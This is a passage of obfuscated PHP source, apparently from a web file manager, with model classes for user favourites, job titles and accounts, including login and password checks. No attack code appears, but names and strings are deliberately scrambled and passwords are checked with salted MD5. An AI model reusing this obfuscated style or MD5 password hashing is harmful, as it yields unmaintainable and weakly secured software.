$this->_fileOutImage($c—¼ğ§„ò, $AÂÌ®ï§È©); } public function fileOutImageServer($cÛ´¢áº¼, $f£œ²¡´¢¨ = 250) { $this->_fileOutImage($cÛ´¢áº¼, $f£œ²¡´¢¨); } public function link($BÇ§…†¦™ˆ, $D–·„ªš‘› = '') { $D´”Â™»±” = $this->model->fileInfoGet($BÇ§…†¦™ˆ); return IO::link($D´”Â™»±”[$_SERVER[Å¸ş][75]], $D–·„ªš‘›); } protected function parse($dÃÃ´˜ö†ò) { $AÀ’Ÿº‘× =& $_SERVER[Å¸ş]; if (strstr($dÃÃ´˜ö†ò, $AÀ’Ÿº‘×[8]) === !1) { return array($AÀ’Ÿº‘×[385] => intval($dÃÃ´˜ö†ò), $AÀ’Ÿº‘×[75] => $AÀ’Ÿº‘×[33], $AÀ’Ÿº‘×[1116] => array()); } $cÕÏ»‚äÃŞ = explode($AÀ’Ÿº‘×[8], trim($dÃÃ´˜ö†ò, $AÀ’Ÿº‘×[8])); if (count($cÕÏ»‚äÃŞ) < 2) { show_tips($dÃÃ´˜ö†ò . $AÀ’Ÿº‘×[1121]); } return array($AÀ’Ÿº‘×[385] => intval($cÕÏ»‚äÃŞ[0]), $AÀ’Ÿº‘×[75] => $cÕÏ»‚äÃŞ[1], $AÀ’Ÿº‘×[1116] => array_slice($cÕÏ»‚äÃŞ, 1)); } } goto a•†¯áé§; D£‹õç²Ò…: class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($b“ÄÅÃÓÍ) { $b«À İ¡İ =& $_SERVER[Å¸ş]; return array($b«À İ¡İ[2204] => array(USER_ID, $b«À İ¡İ[2519])); } protected function listData() { $Dã Êµ­Ô =& $_SERVER[Å¸ş]; $CÎÀ­Şà‘İ = array($Dã Êµ­Ô[1427] => USER_ID, $Dã Êµ­Ô[436] => 0); $EçÜáëÎ‰‰ = $Dã Êµ­Ô[2520]; $cÑÔíòÙ…å = $this->field($EçÜáëÎ‰‰)->where($CÎÀ­Şà‘İ)->order($Dã Êµ­Ô[2521])->select(); return $cÑÔíòÙ…å ? $cÑÔíòÙ…å : array(); } protected function resetCache() { } protected function listView() { goto EèÃ‘ÓÃè×; fÄÍº‡ÌÈ„: $Bˆ“«¦ğÀ¾ = array_to_keyvalue($Bˆ“«¦ğÀ¾, $Cİå½¤Û‘[369]); foreach ($ašŸÄ½¬²” as $a¹„İìö¿ => $A—ÅÀ×©¾•) { $e¬Òò’ßäÄ = $Bˆ“«¦ğÀ¾[$A—ÅÀ×©¾•[$Cİå½¤Û‘[75]]]; $e¬Òò’ßäÄ = $e¬Òò’ßäÄ ? $e¬Òò’ßäÄ : array(); $ašŸÄ½¬²”[$a¹„İìö¿] = array_merge($e¬Òò’ßäÄ, $A—ÅÀ×©¾•); } return $ašŸÄ½¬²”; goto E„ò õÑÏ; b¥—º¦ÆŒˆ: $eÑÄ°Ö¬Å = array_to_keyvalue($c’ÌŠÊ×‰½, $Cİå½¤Û‘[33], $Cİå½¤Û‘[75]); if (!$eÑÄ°Ö¬Å) { return $ašŸÄ½¬²”; } $d¾Úù­§›  = 2000; goto b·ÔÏ³—‰è; EèÃ‘ÓÃè×: $Cİå½¤Û‘ =& $_SERVER[Å¸ş]; $ašŸÄ½¬²” = $this->listData(); $c’ÌŠÊ×‰½ = array_filter_by_field($ašŸÄ½¬²”, $Cİå½¤Û‘[29], $Cİå½¤Û‘[382]); goto b¥—º¦ÆŒˆ; b·ÔÏ³—‰è: $F°íáòë¨ = array($Cİå½¤Û‘[383] => array($Cİå½¤Û‘[384], $eÑÄ°Ö¬Å)); $Bˆ“«¦ğÀ¾ = Model($Cİå½¤Û‘[755])->listSource($F°íáòë¨, $d¾Úù­§› ); $Bˆ“«¦ğÀ¾ = array_merge($Bˆ“«¦ğÀ¾[$Cİå½¤Û‘[73]], $Bˆ“«¦ğÀ¾[$Cİå½¤Û‘[74]]); goto fÄÍº‡ÌÈ„; E„ò õÑÏ: } protected function addFav($aï¹Ó¥šë, $f©ÂÚÍ…ç© = '', $b…Â¾ƒğ¨Ÿ = "\x73\157\165\162\x63\x65") { goto A˜íÍ‚’ÚÃ; b¬ÇàÒ–ŠÅ: return $this->add($bÅÅ³“µİØ); goto Aà¹‹Îš‹; fôê«Æê¡›: $A²àë®ƒ³ = array($DÉŠŞö°±[1427] => USER_ID, $DÉŠŞö°±[436] => 0); $F¹êÕÎ©Úæ = $this->where($A²àë®ƒ³)->max($DÉŠŞö°±[2130]); if (!$F¹êÕÎ©Úæ) { $F¹êÕÎ©Úæ = 0; } goto fÒòÎ²ƒÛ›; fÒòÎ²ƒÛ›: if (!$f©ÂÚÍ…ç© && $b…Â¾ƒğ¨Ÿ == $DÉŠŞö°±[382]) { $cÑÉÕÔç– = Model($DÉŠŞö°±[1115])->where(array($DÉŠŞö°±[383] => $aï¹Ó¥šë))->find(); if (!$cÑÉÕÔç–) { return !1; } $f©ÂÚÍ…ç© = $cÑÉÕÔç–[$DÉŠŞö°±[28]]; } $f©ÂÚÍ…ç© = $this->getAutoName($f©ÂÚÍ…ç©); $bÅÅ³“µİØ = array($DÉŠŞö°±[1427] => USER_ID, $DÉŠŞö°±[436] => 0, $DÉŠŞö°±[386] => $f©ÂÚÍ…ç©, $DÉŠŞö°±[387] => $aï¹Ó¥šë, $DÉŠŞö°±[388] => $b…Â¾ƒğ¨Ÿ, $DÉŠŞö°±[2112] => $F¹êÕÎ©Úæ + 1); goto b¬ÇàÒ–ŠÅ; A˜íÍ‚’ÚÃ: $DÉŠŞö°± =& $_SERVER[Å¸ş]; $A²àë®ƒ³ = array($DÉŠŞö°±[1427] => USER_ID, $DÉŠŞö°±[436] => 0, $DÉŠŞö°±[388] => $b…Â¾ƒğ¨Ÿ, $DÉŠŞö°±[387] => $aï¹Ó¥šë); if ($this->where($A²àë®ƒ³)->find()) { return !1; } goto fôê«Æê¡›; Aà¹‹Îš‹: } protected function remove($fàÓ¼¿•ßâ) { $cº¯¤ôÒº =& $_SERVER[Å¸ş]; $fÌî†Á¥Õ³ = array($cº¯¤ôÒº[1427] => USER_ID, $cº¯¤ôÒº[385] => $fàÓ¼¿•ßâ); return $this->where($fÌî†Á¥Õ³)->delete(); } protected function removeByName($F…÷†îİ„) { $B’“ˆå“”» =& $_SERVER[Å¸ş]; $E¥Ïºæ–…é = array($B’“ˆå“”»[1427] => USER_ID, $B’“ˆå“”»[386] => $F…÷†îİ„, $B’“ˆå“”»[436] => 0); return $this->where($E¥Ïºæ–…é)->delete(); } protected function rename($AšêíÉÕ¾‡, $Eé„”Ìõïï) { $bÏÆ„Ó÷©ï =& $_SERVER[Å¸ş]; if ($AšêíÉÕ¾‡ == $Eé„”Ìõïï) { return !1; } $eïÈä’øˆŠ = $this->getAutoName($Eé„”Ìõïï); if ($Eé„”Ìõïï != $eïÈä’øˆŠ) { return !1; } $fŸ¯¶ âÒ“ = array($bÏÆ„Ó÷©ï[1427] => USER_ID, $bÏÆ„Ó÷©ï[436] => 0, $bÏÆ„Ó÷©ï[28] => $AšêíÉÕ¾‡); return $this->where($fŸ¯¶ âÒ“)->save(array($bÏÆ„Ó÷©ï[28] => $Eé„”Ìõïï)); } protected function resetSort($dè×ó¨ò¶) { $D  í™ÂÖô =& $_SERVER[Å¸ş]; $dè×ó¨ò¶ = is_array($dè×ó¨ò¶) ? $dè×ó¨ò¶ : array(); $dÂ»¦‘£ïĞ = array($D  í™ÂÖô[1427] => USER_ID); for ($aÖéÁ÷å¶¥ = 0; $aÖéÁ÷å¶¥ < count($dè×ó¨ò¶); $aÖéÁ÷å¶¥++) { $dÂ»¦‘£ïĞ[$D  í™ÂÖô[385]] = $dè×ó¨ò¶[$aÖéÁ÷å¶¥]; $this->where($dÂ»¦‘£ïĞ)->save(array($D  í™ÂÖô[2112] => $aÖéÁ÷å¶¥ + 1)); } return !0; } protected function moveTop($F’Â±Ÿô˜‘) { goto B‹¨ÌÖéä; EÚàË×¹´˜: if (!$CìÄğ‰ÆŸÎ) { return; } $F·‡¨ÍÆ§Ê = $this->field($A·Åƒ®¥[367])->where($F­¨¼‘µç)->order($A·Åƒ®¥[2521])->select(); $F·‡¨ÍÆ§Ê = array_to_keyvalue($F·‡¨ÍÆ§Ê, $A·Åƒ®¥[33], $A·Åƒ®¥[367]); goto Fç¨»Éè¨; B‹¨ÌÖéä: $A·Åƒ®¥ =& $_SERVER[Å¸ş]; $F­¨¼‘µç = array($A·Åƒ®¥[1427] => USER_ID, $A·Åƒ®¥[436] => 0); $CìÄğ‰ÆŸÎ = $this->where($F­¨¼‘µç)->where(array($A·Åƒ®¥[28] => $F’Â±Ÿô˜‘))->find(); goto EÚàË×¹´˜; dÒë¢ó¶÷é: return $this->resetSort($F·‡¨ÍÆ§Ê); goto b³ò—ß¤ª; Fç¨»Éè¨: $e¾íáŸÁŒ = $F·‡¨ÍÆ§Ê; $F·‡¨ÍÆ§Ê = array_remove_value($F·‡¨ÍÆ§Ê, $CìÄğ‰ÆŸÎ[$A·Åƒ®¥[367]]); array_unshift($F·‡¨ÍÆ§Ê, $CìÄğ‰ÆŸÎ[$A·Åƒ®¥[367]]); goto dÒë¢ó¶÷é; b³ò—ß¤ª: } protected function moveBottom($cËõ¸¿±¯) { $bÄ‚½ƒÖ‘× =& $_SERVER[Å¸ş]; $FêÉŞ„½® = array($bÄ‚½ƒÖ‘×[1427] => USER_ID, $bÄ‚½ƒÖ‘×[436] => 0); $fô¯¢ê½° = $this->where($FêÉŞ„½®)->max($bÄ‚½ƒÖ‘×[2130]); $få¤äßŸ… = array($bÄ‚½ƒÖ‘×[2130] => $fô¯¢ê½° + 1); return $this->where($FêÉŞ„½®)->where(array($bÄ‚½ƒÖ‘×[28] => $cËõ¸¿±¯))->save($få¤äßŸ…); } private function getAutoName($eåÅÊ¥«) { goto C÷ø¨î‰ˆ¦; D‚ã‡ªñœ¾: $Aê´ÉŸ¨íğ = array_to_keyvalue($Aê´ÉŸ¨íğ, $D¥½¿±‘‹[33], $D¥½¿±‘‹[28]); if (!$Aê´ÉŸ¨íğ || !in_array($eåÅÊ¥«, $Aê´ÉŸ¨íğ)) { return $eåÅÊ¥«; } for ($e·¡•×ïá = 0; $e·¡•×ïá < count($Aê´ÉŸ¨íğ); $e·¡•×ïá++) { if (!in_array($eåÅÊ¥« . "\x28{$e·¡•×ïá}\51", $Aê´ÉŸ¨íğ)) { return $eåÅÊ¥« . "\50{$e·¡•×ïá}\x29"; } } goto C¡âÀ®œ; C÷ø¨î‰ˆ¦: $D¥½¿±‘‹ =& $_SERVER[Å¸ş]; $FÀĞŸŒäà = array($D¥½¿±‘‹[1427] => USER_ID, $D¥½¿±‘‹[436] => 0); $Aê´ÉŸ¨íğ = $this->field($D¥½¿±‘‹[28])->where($FÀĞŸŒäà)->select(); goto D‚ã‡ªñœ¾; C¡âÀ®œ: return $eåÅÊ¥« . "\50{$e·¡•×ïá}\51"; goto B¬œ®–Œ‚„; B¬œ®–Œ‚„: } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\152\157\142\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\144\x65\163\x63", "\x73\x6f\162\164"); const JOB_KEY = "\x73\x65\x6c\146\112\x6f\142\114\x69\163\x74"; public function listData($eÊœ±”ÍòŠ = false, $c–Ëâ¡÷ = "\x73\157\162\164", $Eë¥ÖÆÓˆ¢ = false) { return parent::listData($eÊœ±”ÍòŠ, $c–Ëâ¡÷, $Eë¥ÖÆÓˆ¢); } public function remove($F£ĞÅÛ†Üù) { return parent::remove($F£ĞÅÛ†Üù); } public function add($Eô©á¤ô¿²) { $B¸ƒ×†Öà¸ =& $_SERVER[Å¸ş]; if ($this->findByName($Eô©á¤ô¿²[$B¸ƒ×†Öà¸[28]])) { return !1; } $Eô©á¤ô¿²[$B¸ƒ×†Öà¸[2130]] = $this->getSort(); return parent::insert($Eô©á¤ô¿²); } private function getSort() { $cÑ™ø¦‰İ˜ =& $_SERVER[Å¸ş]; $Fòá–â²¬– = parent::listData(); $Fí¬‹™–» = array_to_keyvalue($Fòá–â²¬–, $cÑ™ø¦‰İ˜[33], $cÑ™ø¦‰İ˜[2130]); return empty($Fí¬‹™–») ? 0 : max($Fí¬‹™–») + 1; } public function update($BÍó¨Œ‹Ê°, $D‚š£œµ†) { $eŒÌí¦ª ¶ =& $_SERVER[Å¸ş]; $A¼íœĞÏ® = parent::listData($BÍó¨Œ‹Ê°); $eÊ¤Ÿ¿Ò²ø = $this->findByName($D‚š£œµ†[$eŒÌí¦ª ¶[28]]); if (!$A¼íœĞÏ® || $eÊ¤Ÿ¿Ò²ø && $eÊ¤Ÿ¿Ò²ø[$eŒÌí¦ª ¶[367]] != $A¼íœĞÏ®[$eŒÌí¦ª ¶[367]]) { return !1; } return parent::update($BÍó¨Œ‹Ê°, $D‚š£œµ†); } public function setUserJob($a¨«óğƒâ¬, $aŸ½é±¢’‰) { goto Bö—è±é ù; Bö—è±é ù: $cÂè–ó´´ò =& $_SERVER[Å¸ş]; if (!is_array($aŸ½é±¢’‰)) { $aŸ½é±¢’‰ = array($aŸ½é±¢’‰); } $F£±…Áàœâ = parent::listData(); goto CíÁëéÍ; d¦ ªÙ½Ü¶: $aÉæÓ«ĞÖ = rtrim($aÉæÓ«ĞÖ, $cÂè–ó´´ò[47]); Model($cÂè–ó´´ò[479])->metaSet($a¨«óğƒâ¬, self::JOB_KEY, $aÉæÓ«ĞÖ); goto B†È¡è·òÚ; CíÁëéÍ: $bïç®•åßÂ = array_to_keyvalue($F£±…Áàœâ, $cÂè–ó´´ò[28]); $aÉæÓ«ĞÖ = $cÂè–ó´´ò[361]; foreach ($aŸ½é±¢’‰ as $BŠÀ­à ¯‡) { if ($bïç®•åßÂ[$BŠÀ­à ¯‡]) { $aÉæÓ«ĞÖ .= $bïç®•åßÂ[$BŠÀ­à ¯‡][$cÂè–ó´´ò[367]] . $cÂè–ó´´ò[47]; } else { $E¨æÍ¼Ï÷ = $this->add($BŠÀ­à ¯‡); $aÉæÓ«ĞÖ .= $E¨æÍ¼Ï÷ . $cÂè–ó´´ò[47]; } } goto d¦ ªÙ½Ü¶; B†È¡è·òÚ: } public function getUserJob($Eó‹Èª×’) { $CˆÜÓß©Ì = Model($_SERVER[Å¸ş][479])->metaGet($Eó‹Èª×’); return $this->getUserJobInfo($CˆÜÓß©Ì[self::JOB_KEY]); } public function getUserJobInfo($DëŸâòƒ) { goto Ağå’º–†; Ağå’º–†: $Fª„Á§ª• =& $_SERVER[Å¸ş]; $A«šÓ‚åª¤ = explode($Fª„Á§ª•[47], $DëŸâòƒ); $E¤é°©–¯‰ = parent::listData(); goto E¸«©¯ËÀ; E¸«©¯ËÀ: $E¤é°©–¯‰ = array_remove_key($E¤é°©–¯‰, $Fª„Á§ª•[187]); $EõŠƒÓ´Ñá = array(); foreach ($A«šÓ‚åª¤ as $e¦¹×£Ø’) { if (isset($E¤é°©–¯‰[$e¦¹×£Ø’])) { $EõŠƒÓ´Ñá[] = $E¤é°©–¯‰[$e¦¹×£Ø’]; } } goto eÀ¿ä¶É; eÀ¿ä¶É: return $EõŠƒÓ´Ñá; goto EõË…Š‘î; EõË…Š‘î: } } class UserModel extends ModelBase { protected $tableName = "\x75\163\145\x72"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\165\x73\x65\162\x5f\x6d\145\x74\141", "\x6d\x65\x74\x61\106\151\145\154\144" => "\165\x73\145\x72\x49\104"); protected $simpleField = "\x75\163\145\162\111\104\54\x6e\151\x63\x6b\x4e\x61\x6d\145\x2c\x6e\x61\x6d\145\54\141\166\141\164\x61\162\x2c\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($EÊ±š‰çÃ¶) { $A¤ÇÅÔ¨ÕÓ =& $_SERVER[Å¸ş]; $C“ Ìï¤Î = $A¤ÇÅÔ¨ÕÓ[2522]; return array($A¤ÇÅÔ¨ÕÓ[2177] => array($EÊ±š‰çÃ¶[0], $C“ Ìï¤Î), $A¤ÇÅÔ¨ÕÓ[2179] => array($EÊ±š‰çÃ¶[0], $C“ Ìï¤Î), $A¤ÇÅÔ¨ÕÓ[2523] => array($EÊ±š‰çÃ¶[0], $C“ Ìï¤Î)); } protected function getInfo($c›„Á¡Õ§, $FÎ“Š‰¶â = false) { $Fîñ¹õÉ = $this->getInfoSimple($c›„Á¡Õ§); if (!is_array($Fîñ¹õÉ)) { return array(); } if ($FÎ“Š‰¶â) { return $this->_getInfoApply($Fîñ¹õÉ); } return $this->cacheFunctionGet($_SERVER[Å¸ş][2233], $c›„Á¡Õ§); } protected function getInfoFull($Eïïª–†Ô, $CøŸ­ÒÈß” = false) { $bâ¿ŒšÛ = $this->getInfoSimple($Eïïª–†Ô); if (!is_array($bâ¿ŒšÛ)) { return array(); } if ($CøŸ­ÒÈß”) { return $this->_getInfoApply($bâ¿ŒšÛ, !0); return $this->_getInfoApply($bâ¿ŒšÛ, !0); } return $this->cacheFunctionGet($_SERVER[Å¸ş][2524], $Eïïª–†Ô); } private function _getInfoApply($aÅ˜ƒ‹¹Á‰, $Eï˜×Æï = false) { goto c°›ïÒ¿Ò·; c°›ïÒ¿Ò·: $càÓ…Ş¤¦ =& $_SERVER[Å¸ş]; if (!$aÅ˜ƒ‹¹Á‰) { return $aÅ˜ƒ‹¹Á‰; } $EˆÑºß‰›÷ = md5($càÓ…Ş¤¦[2525] . $aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[799]] . $càÓ…Ş¤¦[2526] . $aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[28]]); goto dÁì³òÖä­; dÁì³òÖä­: $aÅ˜ƒ‹¹Á‰ = $this->_listDataApplyItem($aÅ˜ƒ‹¹Á‰); $b¼ã³Ÿå = Model($càÓ…Ş¤¦[1115])->metaGet($aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[391]][$càÓ…Ş¤¦[369]]); $aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[2527]] = $EˆÑºß‰›÷; goto bÎìÂ¸•¡“; bÎìÂ¸•¡“: $aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[391]][$càÓ…Ş¤¦[2362]] = isset($b¼ã³Ÿå[$càÓ…Ş¤¦[2363]]) ? $b¼ã³Ÿå[$càÓ…Ş¤¦[2363]] : null; if ($Eï˜×Æï) { $aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[417]] = $this->metaGet($aÅ˜ƒ‹¹Á‰[$càÓ…Ş¤¦[1436]]); } return $aÅ˜ƒ‹¹Á‰; goto b Ÿ©ç£‰†; b Ÿ©ç£‰†: } protected function getInfoSimple($dé‘Åâ¿ÎÊ, $Eªª„ŸÅã³ = false) { $FÈ¸›”Õ¢ì =& $_SERVER[Å¸ş]; if (!$dé‘Åâ¿ÎÊ) { return array(); } if ($Eªª„ŸÅã³) { $føÈ…É®¢Ñ = $this->where(array($FÈ¸›”Õ¢ì[1436] => intval($dé‘Åâ¿ÎÊ)))->find(); if (!is_array($føÈ…É®¢Ñ)) { return array(); } $føÈ…É®¢Ñ[$FÈ¸›”Õ¢ì[2528]] = Action($FÈ¸›”Õ¢ì[2529])->parseUrl($føÈ…É®¢Ñ[$FÈ¸›”Õ¢ì[2528]]); return $føÈ…É®¢Ñ; } return $this->cacheFunctionGet($FÈ¸›”Õ¢ì[2180], $dé‘Åâ¿ÎÊ); } protected function getInfoSimpleOuter($fÔ±‚ôë¢æ) { goto AŒÇ…ó¨Øğ; AŒÇ…ó¨Øğ: $f„íñ‘´• =& $_SERVER[Å¸ş]; if (!$fÔ±‚ôë¢æ || $fÔ±‚ôë¢æ == 0) { return array($f„íñ‘´•[1436] => $f„íñ‘´•[470], $f„íñ‘´•[28] => $f„íñ‘´•[157] . LNG($f„íñ‘´•[2530]) . $f„íñ‘´•[478], $f„íñ‘´•[2528] => STATIC_PATH . $f„íñ‘´•[2531]); } $e¡ê©Éë¹´ = $this->cacheFunctionGet($f„íñ‘´•[2180], $fÔ±‚ôë¢æ); goto bÅÅ¢‹‘´¾; Dƒ¿¬É¶ë”: return $Aõ™áË¦³ã; goto fÅÜ•¾–¸; bÅÅ¢‹‘´¾: $Aõ™áË¦³ã = array_field_key($e¡ê©Éë¹´, explode($f„íñ‘´•[47], $this->simpleField)); if (!$Aõ™áË¦³ã) { return array($f„íñ‘´•[1436] => $f„íñ‘´•[1029], $f„íñ‘´•[28] => $f„íñ‘´•[157] . LNG($f„íñ‘´•[2532]) . $f„íñ‘´•[478], $f„íñ‘´•[2528] => STATIC_PATH . $f„íñ‘´•[2533]); } $Aõ™áË¦³ã[$f„íñ‘´•[2528]] = Action($f„íñ‘´•[2529])->parseUrl($Aõ™áË¦³ã[$f„íñ‘´•[2528]]); goto Dƒ¿¬É¶ë”; fÅÜ•¾–¸: } protected function groupUser($E¾áÌ»Ë) { } public static function errorLang($bµŠó˜ƒ¬) { $d©ÁÆÈ™ œ =& $_SERVER[Å¸ş]; $DÍ·åğ»ØÔ = array(self::ERROR_USER_NOT_EXISTS => $d©ÁÆÈ™ œ[2534], self::ERROR_USER_PASSWORD_ERROR => $d©ÁÆÈ™ œ[2535], self::ERROR_USER_EXIST_NAME => $d©ÁÆÈ™ œ[2536], self::ERROR_USER_EXIST_PHONE => $d©ÁÆÈ™ œ[2537], self::ERROR_USER_EXIST_EMAIL => $d©ÁÆÈ™ œ[2538], self::ERROR_USER_LOGIN_LOCK => $d©ÁÆÈ™ œ[2539], self::ERROR_IP_NOT_ALLOW => $d©ÁÆÈ™ œ[2540], self::ERROR_USER_EXIST_NICKNAME => $d©ÁÆÈ™ œ[2541]); return LNG($DÍ·åğ»ØÔ[$bµŠó˜ƒ¬]); } public function getInfoByMeta($bë·ÙßáÆÍ, $DİÑäÕÚ–½) { $dÁ††¡ì±Ç =& $_SERVER[Å¸ş]; $E‚¯»©ªö˜ = Model($dÁ††¡ì±Ç[2542])->where(array($dÁ††¡ì±Ç[89] => $bë·ÙßáÆÍ, $dÁ††¡ì±Ç[359] => $DİÑäÕÚ–½))->find(); if ($E‚¯»©ªö˜) { return $this->getInfo($E‚¯»©ªö˜[$dÁ††¡ì±Ç[1436]]); } return !1; } public function userLoginCheck($eÒùÚóŒŒó, $dÑÄ¦ÄŸÖ§) { goto A…¹ì«Ú¦Â; ašÀóŸöÉ‘: $e¿‰ñ²ïğä = $this->where($cØñÕÑ“¤)->find(); if (!$e¿‰ñ²ïğä) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($e¿‰ñ²ïğä[$céÏğßÒõ[1436]], $dÑÄ¦ÄŸÖ§)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto BçÔÒîìÛ˜; BçÔÒîìÛ˜: $this->userEdit($e¿‰ñ²ïğä[$céÏğßÒõ[1436]], array($céÏğßÒõ[2544] => time())); return $this->getInfo($e¿‰ñ²ïğä[$céÏğßÒõ[1436]]); goto E±‰ê‘¹; A…¹ì«Ú¦Â: $céÏğßÒõ =& $_SERVER[Å¸ş]; $cØñÕÑ“¤ = array($céÏğßÒõ[28] => $eÒùÚóŒŒó, $céÏğßÒõ[2366] => $eÒùÚóŒŒó, $céÏğßÒõ[293] => $eÒùÚóŒŒó, $céÏğßÒõ[2543] => $eÒùÚóŒŒó, $céÏğßÒõ[911] => $céÏğßÒõ[913]); if ($this->nickNameRpt()) { unset($cØñÕÑ“¤[$céÏğßÒõ[2366]]); } goto ašÀóŸöÉ‘; E±‰ê‘¹: } public function clearCache($A¥„¤´Ìğ) { $c›ë«ÍÙÉ =& $_SERVER[Å¸ş]; $this->cacheFunctionClear($c›ë«ÍÙÉ[2233], $A¥„¤´Ìğ); $this->cacheFunctionClear($c›ë«ÍÙÉ[2180], $A¥„¤´Ìğ); $this->cacheFunctionClear($c›ë«ÍÙÉ[2524], $A¥„¤´Ìğ); } public function userPasswordCheck($EÙ¾«·Ï‘¤, $aĞôË²Éâ‰) { $eò‹‘ŸÓ…Ï =& $_SERVER[Å¸ş]; $Bí±•ö™„Ğ = $this->where(array($eò‹‘ŸÓ…Ï[1436] => intval($EÙ¾«·Ï‘¤)))->find(); $d ‚±‹äÏ” = $this->metaGet($EÙ¾«·Ï‘¤); $cä½†…Íöà = isset($d ‚±‹äÏ”[$eò‹‘ŸÓ…Ï[2545]]) ? $d ‚±‹äÏ”[$eò‹‘ŸÓ…Ï[2545]] : $eò‹‘ŸÓ…Ï[33]; if (md5($cä½†…Íöà . trim($aĞôË²Éâ‰)) !== $Bí±•ö™„Ğ[$eò‹‘ŸÓ…Ï[799]]) { return !1; } return !0; } public function userAdd($Añòº¾è˜) { goto f´Š»Çà¬Ö; cò¿¬äöÌ®: $B†š˜ìÉ©¨ = $this->_checkExist($Añòº¾è˜); if ($B†š˜ìÉ©¨ !== !0) { return $B†š˜ìÉ©¨; } $F”ÓŠ²±Ş¾ = $this->add($Dñ§ö†¶ó); goto eö›Î‰æõ; f´Š»Çà¬Ö: $Fô–‹±Ù‹õ =& $_SERVER[Å¸ş]; $Dñ§ö†¶ó = array($Fô–‹±Ù‹õ[386] => $Añòº¾è˜[$Fô–‹±Ù‹õ[28]], $Fô–‹±Ù‹õ[2546] => $Añòº¾è˜[$Fô–‹±Ù‹õ[1319]], $Fô–‹±Ù‹õ[2547] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[293]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[293]] : $Fô–‹±Ù‹õ[33], $Fô–‹±Ù‹õ[2548] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[2543]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[2543]] : $Fô–‹±Ù‹õ[33], $Fô–‹±Ù‹õ[2549] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[2366]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[2366]] : $Añòº¾è˜[$Fô–‹±Ù‹õ[28]], $Fô–‹±Ù‹õ[2550] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[2528]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[2528]] : $Fô–‹±Ù‹õ[33], $Fô–‹±Ù‹õ[2551] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[2552]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[2552]] : 1, $Fô–‹±Ù‹õ[2553] => $Añòº¾è˜[$Fô–‹±Ù‹õ[799]], $Fô–‹±Ù‹õ[2181] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[2092]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[2092]] : 1024 * 1024 * 20, $Fô–‹±Ù‹õ[2182] => 0, $Fô–‹±Ù‹õ[2544] => 0, $Fô–‹±Ù‹õ[2220] => isset($Añòº¾è˜[$Fô–‹±Ù‹õ[692]]) ? $Añòº¾è˜[$Fô–‹±Ù‹õ[692]] : 1); if (!empty($Añòº¾è˜[$Fô–‹±Ù‹õ[1436]])) { $Dñ§ö†¶ó[$Fô–‹±Ù‹õ[1436]] = $Añòº¾è˜[$Fô–‹±Ù‹õ[1436]]; } goto cò¿¬äöÌ®; eö›Î‰æõ: $c’«ãÚ•Û = array($Fô–‹±Ù‹õ[2553] => $Dñ§ö†¶ó[$Fô–‹±Ù‹õ[799]], $Fô–‹±Ù‹õ[2549] => $Dñ§ö†¶ó[$Fô–‹±Ù‹õ[2366]]); $this->userEdit($F”ÓŠ²±Ş¾, $c’«ãÚ•Û); Model($Fô–‹±Ù‹õ[1115])->userRootAdd($F”ÓŠ²±Ş¾); goto dî¶ˆ¶“¼¾; dî¶ˆ¶“¼¾: return $F”ÓŠ²±Ş¾; goto BˆğŞµ£ò; BˆğŞµ£ò: } protected function userEditTest($eÇ§¬Àé, $Cæ•Ïğ¢÷Ü) { return $this->call($_SERVER[Å¸ş][2554], $eÇ§¬Àé, $Cæ•Ïğ¢÷Ü); } protected function userEdit($eçã°ÄåÚË, $C¾œÏÍÏ—) { goto cç©Ä·Ÿ­¶; AİÍ”‚ˆœé: $this->where(array($eÎÚ¨¼‚ë[1427] => $eçã°ÄåÚË))->save($C¾œÏÍÏ—); if (isset($C¾œÏÍÏ—[$eÎÚ¨¼‚ë[2366]])) { $this->setNamePinyin($eçã°ÄåÚË, $C¾œÏÍÏ—[$eÎÚ¨¼‚ë[2366]]); } $this->clearCache($eçã°ÄåÚË); goto Eƒ‹Ø¤¼´§; Eƒ‹Ø¤¼´§: return !0; goto C”„ÑÅ¾¹‹; A–½³®À²º: $BÅ»ˆ “å = $this->_checkExist($C¾œÏÍÏ—, $eçã°ÄåÚË); if ($BÅ»ˆ “å !== !0) { return $BÅ»ˆ “å; } if (isset($C¾œÏÍÏ—[$eÎÚ¨¼‚ë[799]]) && trim($C¾œÏÍÏ—[$eÎÚ¨¼‚ë[799]]) != $eÎÚ¨¼‚ë[33]) { $bƒÃšÓßªÖ = $this->metaGet($eçã°ÄåÚË); if (empty($bƒÃšÓßªÖ[$eÎÚ¨¼‚ë[2545]])) { $bƒÃšÓßªÖ[$eÎÚ¨¼‚ë[2545]] = rand_string(10); Model($eÎÚ¨¼‚ë[476])->metaSet($eçã°ÄåÚË, $eÎÚ¨¼‚ë[2545], $bƒÃšÓßªÖ[$eÎÚ¨¼‚ë[2545]]); } 